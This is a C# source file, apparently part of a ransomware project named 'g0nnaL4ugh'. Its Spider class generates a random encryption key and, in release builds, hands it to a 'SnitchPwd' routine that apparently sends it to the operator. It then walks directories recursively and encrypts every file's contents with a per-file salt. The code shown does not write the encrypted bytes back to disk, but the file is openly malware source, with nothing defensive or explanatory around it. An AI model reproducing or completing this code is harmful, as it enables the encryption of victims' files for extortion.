using System;
using System.Threading;
using System.Collections.Generic;
#if DEBUG
using System.Diagnostics;
#endif
using System.IO;
using g0nnaL4ugh.Crypto;
using g0nnaL4ugh.Finder;
using g0nnaL4ugh.Snitch;

namespace g0nnaL4ugh
{
	public class TaskObject
	{
		private string filePath;
		private List<Node> db;
		private byte[] pwd;

		public TaskObject(string filePath, List<Node> db, byte[] pwd)
		{
			this.filePath = filePath;
			this.db = db;
			this.pwd = pwd;
		}

		public string FilePath { get { return this.filePath; } }
		public List<Node> Db { get { return this.db; } }
		public byte[] Pwd { get { return this.pwd; } }
	}

	public class Spider
	{
		string[] initialPaths;
		List<Node> nodes;
		Encrypter encrypter;
		Decrypter decrypter;
		private byte[] pwd;

		public Spider(string[] paths, Encrypter encrypter)
		{
			this.initialPaths = paths;
			this.encrypter = encrypter;
			this.nodes = new List<Node>();
		}

		public Spider(string[] paths, Decrypter decrypter)
		{
			this.initialPaths = paths;
			this.decrypter = decrypter;
			this.nodes = new List<Node>();
		}

		public void BuildNodesFromPath()
		{
			/*
            * Here can be 2 options:
            *  - Encrypt
            *  - Decrypt
            */
			if (this.IsEncryptionMode())
			{
				this.pwd = this.encrypter.GenerateRandomPrivateKey();
                string password = Utilities.ConvertBytes2B64(this.pwd);
#if DEBUG
                Sender.FakeSnitchPwd(password);
#else
                Sender.SnitchPwd(password);
#endif
            }
			    
            foreach (string path in this.initialPaths)
            {
#if DEBUG
                Stopwatch watch = new Stopwatch();
                watch.Start();
#endif
                // Console.WriteLine("Processing path: " + path);
                this.ProcessDirectory(path, this.nodes);
#if DEBUG
                Double s = watch.ElapsedMilliseconds / 1000d;
                Console.WriteLine("Time consumed by ProcessDirectory is: {0:N2}s", s);
                watch.Stop();
#endif
            }
        }

        private void ProcessDirectory(string path, List<Node> db)
        {
#if DEBUG
            Console.WriteLine("Processing dir: " + path);
#endif
			string[] files = Directory.GetFiles(path);
            string[] childDirectories = Directory.GetDirectories(path);

            foreach(string filePath in files)
            {
				TaskObject taskObject = new TaskObject(filePath, db, this.pwd);
				var resetEvent = new ManualResetEvent(false);
				ThreadPool.QueueUserWorkItem(
					arg =>
				{
					ProcessFile2EncCallback2(taskObject);
					resetEvent.Set();
				});
				resetEvent.WaitOne();
            }

            foreach(string dir in childDirectories)
                this.ProcessDirectory(dir, db);

        }

		private void ProcessFile2EncCallback2(object obj)
		{
			TaskObject taskObject = (TaskObject)obj;
			List<Node> db = taskObject.Db;
			var filePath = taskObject.FilePath;
			byte[] generatedSalt = this.encrypter.GenerateRandomSalt();
			byte[] bytes2Encrypt = File.ReadAllBytes(filePath);
			Node node = new Node(NodeType.File, filePath, generatedSalt);
			db.Add(node);
			byte[] encrypted = this.encrypter.EncryptBytes(
				bytes2Encrypt, taskObject.Pwd, generatedSalt
			);
#if DEBUG
			Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
							  filePath + " | " + Utilities.ConvertBytes2B64(generatedSalt));
			Console.WriteLine("Encrypted bytes: " + Utilities.ConvertBytes2B64(encrypted));
#endif
		}

        private bool IsEncryptionMode()
		{
            /* 
            * We difference the mode of operation by asking if
            * encrypter is not null.
            */
            return this.encrypter != null;
        }
    }
}
